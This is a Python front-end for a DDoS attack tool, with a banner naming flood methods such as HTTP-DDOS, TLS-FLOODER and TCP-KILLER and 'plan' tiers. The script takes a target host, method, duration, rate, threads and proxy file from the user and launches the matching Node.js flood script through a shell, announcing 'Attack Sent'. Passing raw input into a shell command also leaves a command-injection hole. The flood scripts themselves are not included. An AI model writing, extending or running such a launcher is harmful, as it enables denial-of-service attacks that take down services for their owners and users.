import subprocess
import subprocess
import os
import requests,os,time,re,json,uuid,random,sys
from concurrent.futures import ThreadPoolExecutor
import requests
import time
import colorama
import threading 
import aiohttp
import asyncio
import subprocess
import multiprocess
import sys
import time
from time import sleep
from pystyle import *
import os
osystem = sys.platform

if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
  
time.sleep(1)
ascii = r'''
╔══════════════════════════════╦════════════════════════════════════════════╗  
║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║         ╔═╗╔╗ ╦╔╦╗╔═╗  ╔╦╗╔╦╗╔═╗╔═╗        ║
║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║         ║ ║╠╩╗║ ║ ║ ║   ║║ ║║║ ║╚═╗        ║
║⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿║         ╚═╝╚═╝╩ ╩ ╚═╝  ═╩╝═╩╝╚═╝╚═╝        ║
║⣿⣿⣿⣿⣿⣿⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿║    🚀 DDOS PLAN : ADMIN 🔵HaiBe Dz 2006    ║
║⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣦⠀⠀⠀⠘⣿⣿⣿⣿⣿╠═══╦════════════════════════════════════════╣
║⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⠏⠀⠀⠀⠀⠘⣿⣿⣿⣿║ 1 ║    HTTP-DDOS     ║    BaSic ✔          ║
║⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣥⣷⠇⠀⠀⠀⠀⢹⣿⣿⣿║ 2 ║    OBITO-DDOS    ║    BaSic ✔          ║
║⣿⣿⣿⡇⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⢸⣿⣿⣿║ 3 ║    SUPER-SKYNET  ║    PlanVip ✔        ║
║⣿⣿⣿⣿⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣸⣿⣿⣿║ 4 ║    HTTP-ROAD     ║    Admin ✖          ║
║⣿⣿⣿⣿⡆⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠀⠀⠀⠀⢠⣿⣿⣿⣿║ 5 ║    TLS-FLOODER   ║    Admin ✖          ║
║⣿⣿⣿⣿⣿⣄⣠⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⢠⣿⣿⣿⣿⣿║ 6 ║    HTTP-SOCKET   ║    Star Lord ✔      ║
║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡍⠀⢀⣴⣿⣿⣿⣿⣿⣿║ 7 ║    HTTP-LOADER   ║    WinWeb ✖         ║
║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿║ 8 ║    TCP-KILLER    ║    Admin ✔          ║
║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║ 9 ║    TLSv2 FLOOD   ║    BaSic ✖          ║
║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║10 ║    DDOS OBITO    ║    BaSic ✔          ║
╚══════════════════════════════╩═══╩════════════════════════════════════════╝ 
╔══════════════════════════════════╗
║╔╦╗╔╦╗╔═╗╔═╗  ╔═╗╦  ╔═╗╔╗╔╦  ╦╦╔═╗╠════════════════════════════════════════╗
║ ║║ ║║║ ║╚═╗  ╠═╝║  ╠═╣║║║╚╗╔╝║╠═╝║ HOST METHOD TIME RATE THREAD PROXYFILE ║
║═╩╝═╩╝╚═╝╚═╝  ╩  ╩═╝╩ ╩╝╚╝ ╚╝ ╩╩  ╠════════════════════════════════════════╝
╚══════════════════════════════════╝

 '''




banner = r"""
""".replace('▓', '▀')


banner = Add.Add(ascii, banner, center=True)

 

 
print(Colorate.Horizontal(Colors.red_to_blue, banner))
def execute_command(method,target, time, request, thread, proxy_file):
    command = f'node {method}.js {target} {time} {request} {thread} {proxy_file}'
    subprocess.call(command, shell=True)

# Hàm main để lấy thông tin từ người dùng và gọi hàm execute_command
def main():
    target = input("\033[1;36m🔴 :")
    method = input("\033[1;36m🔴 :")
    time = input("\033[1;36m🔴 :")
    request = input("\033[1;36m🔴 :")
    thread = input("\033[1;36m🔴 :")
    proxy_file = input("\033[1;36m🔴 :")
    print("\033[1;93m⚡Attack Sent :\033[1;95m [ HaiDz 2006 ]🚀")
    execute_command(method,target, time, request, thread, proxy_file)

# Gọi hàm main để chạy công cụ
if __name__ == "__main__":
    main()
